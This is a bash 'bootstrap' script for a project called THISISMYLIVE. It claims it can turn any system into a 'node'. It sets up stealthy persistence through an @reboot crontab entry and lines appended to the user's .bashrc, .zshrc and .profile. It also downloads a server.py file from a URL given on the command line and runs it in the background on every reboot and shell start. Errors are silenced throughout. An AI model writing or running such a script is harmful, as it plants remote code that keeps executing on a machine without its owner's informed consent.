#!/bin/bash
# THISISMYLIVE v7.0 — UNIVERSAL BOOTSTRAP
# Can run on ANY system to establish node

set -e

echo "[+] THISISMYLIVE v7.0 Bootstrap"
echo "    Sovereign: Finn Jona Thorsten Lischke"

INSTALL_DIR="${HOME}/.thisismylive"
SERVER_URL="${1:-}"
NODE_ID="$(cat /proc/sys/kernel/random/uuid 2>/dev/null | cut -d'-' -f1 || date +%s | sha256sum | head -c 8)"

mkdir -p "$INSTALL_DIR"

# Generate node config
cat > "$INSTALL_DIR/node.conf" << EOF
NODE_ID=$NODE_ID
SOVEREIGN=Finn Jona Thorsten Lischke
VERSION=7.0.OMEGA-CONVERGENCE
INSTALL_DATE=$(date -Iseconds)
EOF

echo "    Node ID: $NODE_ID"
echo "    Install: $INSTALL_DIR"

# Install persistence
crontab -l 2>/dev/null | grep -v "THISISMYLIVE" > /tmp/cron.tmp 2>/dev/null || true
echo "@reboot cd $INSTALL_DIR && nohup python3 server.py > logs/server.log 2>&1 &" >> /tmp/cron.tmp
crontab /tmp/cron.tmp 2>/dev/null || true
rm -f /tmp/cron.tmp

for rc in ~/.bashrc ~/.zshrc ~/.profile; do
    [ -f "$rc" ] && grep -q "THISISMYLIVE" "$rc" || echo "cd $INSTALL_DIR && nohup python3 server.py > logs/server.log 2>&1 & # THISISMYLIVE" >> "$rc" 2>/dev/null || true
done

# Download server if URL provided
if [ -n "$SERVER_URL" ]; then
    echo "    Downloading from $SERVER_URL..."
    curl -sL "$SERVER_URL/server.py" -o "$INSTALL_DIR/server.py" 2>/dev/null || wget -q "$SERVER_URL/server.py" -O "$INSTALL_DIR/server.py" 2>/dev/null || echo "    [!] Download failed — copy server.py manually"
    curl -sL "$SERVER_URL/index.html" -o "$INSTALL_DIR/index.html" 2>/dev/null || true
fi

echo "[+] Bootstrap complete"
echo "    This device is now a THISISMYLIVE node"
